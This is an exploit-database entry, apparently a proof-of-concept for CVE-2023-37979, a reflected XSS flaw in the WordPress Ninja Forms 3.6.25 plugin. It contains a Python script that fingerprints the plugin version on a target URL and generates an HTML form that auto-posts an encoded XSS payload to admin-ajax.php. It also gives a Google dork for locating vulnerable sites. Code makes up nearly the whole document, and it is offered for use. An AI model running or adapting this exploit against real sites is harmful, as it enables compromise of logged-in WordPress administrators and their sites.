@@ -1,0 +1,165 @@
+id: 38931
+date: 08/04/2023
+title: WordPress Ninja Forms 3.6.25 Plugin - Reflected XSS Exploit
+author: Mehran Seifalinia
+cves: CVE-2023-37979
+
+# Exploit Title: WordPress Plugin Ninja Forms 3.6.25 - Reflected XSS (Authenticated)
+# Google Dork: inurl:/wp-content/plugins/ninja-forms/readme.txt
+# Exploit Author: Mehran Seifalinia
+# Vendor Homepage: https://ninjaforms.com/
+# Software Link: https://downloads.wordpress.org/plugin/ninja-forms.3.6.25.zip
+# Version: 3.6.25
+# Tested on: Windows 10
+# CVE: CVE-2023-37979
+
+from requests import get
+from sys import argv
+from os import getcwd
+import webbrowser
+from time import sleep
+
+
+# Values:
+url = argv[-1]
+if url[-1] == "/":
+    url = url.rstrip("/")
+
+# Constants
+CVE_NAME = "CVE-2023-37979"
+VULNERABLE_VERSION = "3.6.25"
+
+  # HTML template
+HTML_TEMPLATE = f"""<!DOCTYPE html>
+<!-- Created By Mehran Seifalinia -->
+<html>
+<head>
+  <title>{CVE_NAME}</title>
+  <style>
+    body {{
+      font-family: Arial, sans-serif;
+      background-color: #f7f7f7;
+      color: #333;
+      margin: 0;
+      padding: 0;
+    }}
+    header {{
+      background-color: #4CAF50;
+      padding: 10px;
+      text-align: center;
+      color: white;
+      font-size: 24px;
+    }}
+    .cool-button {{
+      background-color: #007bff;
+      color: white;
+      padding: 10px 20px;
+      border: none;
+      cursor: pointer;
+      font-size: 16px;
+      border-radius: 4px;
+    }}
+    .cool-button:hover {{
+      background-color: #0056b3;
+    }}
+  </style>
+</head>
+<body>
+  <header>
+	Ninja-forms reflected XSS ({CVE_NAME})</br>
+    Created by Mehran Seifalinia
+  </header>
+  <div style="padding: 20px;">
+    <form action="{url}/wp-admin/admin-ajax.php" method="POST">
+      <input type="hidden" name="action" value="nf&#95;batch&#95;process" />
+      <input type="hidden" name="batch&#95;type" value="import&#95;form&#95;template" />
+      <input type="hidden" name="security" value="e29f2d8dca" />
+      <input type="hidden" name="extraData&#91;template&#93;" value="formtemplate&#45;contactformd" />
+      <input type="hidden" name="method&#95;override" value="&#95;respond" />
+      <input type="hidden" name="data" value="Mehran"&#125;&#125;<img&#32;src&#61;Seifalinia&#32;onerror&#61;alert&#40;String&#46;fromCharCode&#40;78&#44;105&#44;110&#44;106&#44;97&#44;45&#44;102&#44;111&#44;114&#44;109&#44;115&#44;32&#44;114&#44;101&#44;102&#44;108&#44;101&#44;99&#44;116&#44;101&#44;100&#44;32&#44;88&#44;83&#44;83&#44;10&#44;67&#44;86&#44;69&#44;45&#44;50&#44;48&#44;50&#44;51&#44;45&#44;51&#44;55&#44;57&#44;55&#44;57&#44;10&#44;45&#44;77&#44;101&#44;104&#44;114&#44;97&#44;110&#44;32&#44;83&#44;101&#44;105&#44;102&#44;97&#44;108&#44;105&#44;110&#44;105&#44;97&#44;45&#41;&#41;>" />
+      <input type="submit" class="cool-button" value="Click here to Execute XSS" />
+    </form>
+  </div>
+  <div style="background-color:red;color:white;padding:1%;">After click on the button, If you received a 0 or received an empty page in browser , that means you need to login first.</div>
+  <footer>
+	<a href="https://github.com/Mehran-Seifalinia">Github</a>
+	</br>
+	<a href="https://www.linkedin.com/in/mehran-seifalinia-63577a1b6/?originalSubdomain=ir">LinkedIn</a
+  </footer>
+</body>
+</html>
+"""
+
+def exploit():
+    with open(f"{CVE_NAME}.html", "w") as poc:
+        poc.write(HTML_TEMPLATE)
+        print(f"[@] POC Generated at {getcwd()}\{CVE_NAME}.html")
+        print("^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^")
+        sleep(2)
+        webbrowser.open(f"{getcwd()}\{CVE_NAME}.html")
+
+# Check if the vulnerable version is installed
+def check_CVE():
+    try:
+        response = get(url + "/wp-content/plugins/ninja-forms/readme.txt")
+        if response.status_code != 200 or not("Ninja Forms" in response.text):
+            print("[!] Ninja-forms plugin has not installed on this site.")
+            return False
+        else:
+            version = response.text.split("Stable tag:")[1].split("License")[0].split()[0]
+            main_version = int(version.split(".")[0])
+            partial_version = int(version.split(".")[1])
+            final_version = int(version.split(".")[2])
+            if (main_version < 3) or (main_version == 3 and partial_version < 6) or (main_version == 3 and partial_version == 6 and final_version <= 25):
+                print(f"[*] Vulnerable Nonja-forms version {version} detected!")
+                return True
+            else:
+                print(f"[!] Nonja-forms version {version} is not vulnerable!")
+                return False
+    except Exception as error:
+        print(f"[!] Error: {error}")
+        exit()
+
+# Check syntax of the script
+def check_script():
+    usage = f"""
+Usage: {argv[0].split("/")[-1].split("/")[-1]} [OPTIONS] [TARGET]
+
+    OPTIONS:
+        --exploit:  Open a browser and execute the vulnerability.
+    TARGET:
+        An URL starts with 'http://' or 'https://'
+
+Examples:
+    > {argv[0].split("/")[-1]} https://vulnsite.com
+    > {argv[0].split("/")[-1]} --exploit https://vulnsite.com
+"""
+    try:
+        if len(argv) < 2 or len(argv) > 3:
+            print("[!] Syntax error...")
+            print(usage)
+            exit()
+        elif not url.startswith(tuple(["http://", "https://"])):
+            print("[!] Invalid target...\n\tTarget most starts with 'http://' or 'https://'")
+            exit()
+        else:
+            for arg in argv:
+                if arg == argv[0]:
+                    print("[*]Starting the script >>>")
+                    state = check_CVE()
+                    if state == False:
+                        exit()
+                elif arg.lower() == "--exploit":
+                    exploit()
+                elif arg == url:
+                    continue
+                else:
+                    print(f"[!] What the heck is '{arg}' in the command?")
+    except Exception as error:
+        print(f"[!] Error: {error}")
+        exit()
+
+if __name__ == "__main__":
+    check_script()
+
+#  0day.today [2023-08-09]  #
